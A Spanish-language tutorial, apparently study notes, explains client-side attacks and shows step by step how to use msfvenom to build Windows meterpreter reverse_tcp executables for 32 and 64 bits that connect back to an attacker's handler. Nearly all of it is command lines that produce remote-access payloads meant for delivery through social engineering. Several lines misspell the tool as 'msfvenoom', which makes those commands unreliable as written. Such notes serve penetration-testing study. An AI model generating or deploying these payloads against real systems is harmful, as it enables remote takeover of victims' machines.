Un ataque del lado del cliente es un vector de ataque que involucra la ejecucion de un payload (carga util) malicioso en el objetivo que en consecuencia conecta al atacante cuando es ejecutado.
Estos tipos de ataques utilizan varias tecnicas de ingenieria social como la creacion de documentos malicioso o ejecutables portables (PEs).
Los client-side attacks toman ventaja de la vulnerabilidad humana.


# Msfvenom
Msfvenom es una utilidad de linea de comandos que puede ser utilizada para codificar MSF payloads para varios sistemas operativos como servidores web.
Msfvenom es una combinacion de dos utilidades, msfpayload y msfencode.
Podemos utililzar msfvenom para generar payloads malicisos de meterpreter que pueden ser transferidos al sistema objetivo. Una vez ejecutado, el payload se va a conectar con nuestro handler dandonos acceso remoto al sistema objetivo.

Podemos listar los payloads disponibles en msfvenom con con comando:
	msfvenom --list payloads
Para los payloads de meterpreter es necesario especificar correctamente el sistema operativo objetivo (windows o linux) y su arquitectura (32 o 64 bits).

Si quisiera generar un payload para una arquitectura de 32bits lo hago de la siguiente manera:
	msfvenom -a
		El -a es para especificar la arquitectura, por ejemplo si fuera de 32bits seria msfvenom -a x86
	msfvenom -a x86 -p
		El -p es para especificar el payload a utilizar.
	msfvenom -a x86 -p windows/meterpreter/reverse_tcp
		Una vez especificado el payload que queremos ejecutar, debemos especificar la informacion de la maquina atacante.
	msfvenoom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PUERTO
		Una vez que colocamos la informacion de la maquina atacante, debemos especificar el formato del payload, para windows el ejecutable sera un .exe esto lo hacemos con un -f (formato).
	msfvenoom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PUERTO -f exe
		Ahora debemos especificar donde queremos colocar ese payload y su nombre. Para ello utilizaremos la redireccion ">".
	msfvenoom -a x86 -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PUERTO -f exe > /home/directorio/payloadx32.exe
Si qusiera crear basicamente el mismo payload pero para una arquitectura de 64bits seria muy similar al anterior:
	msfvenoom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PUERTO -f exe > /home/directorio/payloadx64.exe

Hay una gran cantidad de formatos disponibles, para listarlos puedo usar el comando:
	msfvenom --list formats